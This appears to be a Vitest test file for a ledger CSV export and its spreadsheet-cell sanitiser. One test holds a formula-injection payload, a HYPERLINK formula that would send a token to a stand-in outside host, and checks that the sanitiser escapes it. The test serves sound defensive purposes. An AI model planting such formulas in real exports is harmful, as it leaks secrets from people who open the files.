import { describe, expect, it } from "vitest";
import type { DealLedgerEntry } from "@/lib/accounting";
import { createLedgerCsvExport, safeSpreadsheetCell } from "./ledger-csv";

const row = (patch: Partial<DealLedgerEntry> = {}): DealLedgerEntry => ({
  id: "ledger-2",
  dealId: "deal-1",
  kind: "fee",
  amount: 1_500_000,
  receivedAmount: 1_000_000,
  occurredOn: "2026-08-12",
  paidOn: null,
  attributionMonth: "2026-08-01",
  vatIncluded: false,
  taxInvoiceIssued: false,
  ...patch,
});

describe("createLedgerCsvExport", () => {
  it("exports only the inclusive occurrence-date range in a deterministic order", () => {
    const result = createLedgerCsvExport([
      row({ id: "ledger-2" }),
      row({ id: "ledger-1", occurredOn: "2026-08-12", kind: "contract_deposit" }),
      row({ id: "outside", occurredOn: "2026-09-01" }),
    ], { from: "2026-08-01", to: "2026-08-31" });

    expect(result.filename).toBe("업무원장_2026-08-01_2026-08-31.csv");
    expect(result.rowCount).toBe(2);
    expect(result.content).toContain('"ledger-1"');
    expect(result.content.indexOf('"ledger-1"')).toBeLessThan(result.content.indexOf('"ledger-2"'));
    expect(result.content).not.toContain('"outside"');
  });

  it("does not let spreadsheet formulas execute from exported text", () => {
    expect(safeSpreadsheetCell("=HYPERLINK(\"https://example.invalid/?token=secret\")")).toBe(
      "\"'=HYPERLINK(\"\"https://example.invalid/?token=secret\"\")\"",
    );
    expect(safeSpreadsheetCell(" normal")).toBe('" normal"');
  });

  it("rejects an inverted date range", () => {
    expect(() => createLedgerCsvExport([], { from: "2026-09-01", to: "2026-08-31" })).toThrow(
      "from must not be after to",
    );
  });
});
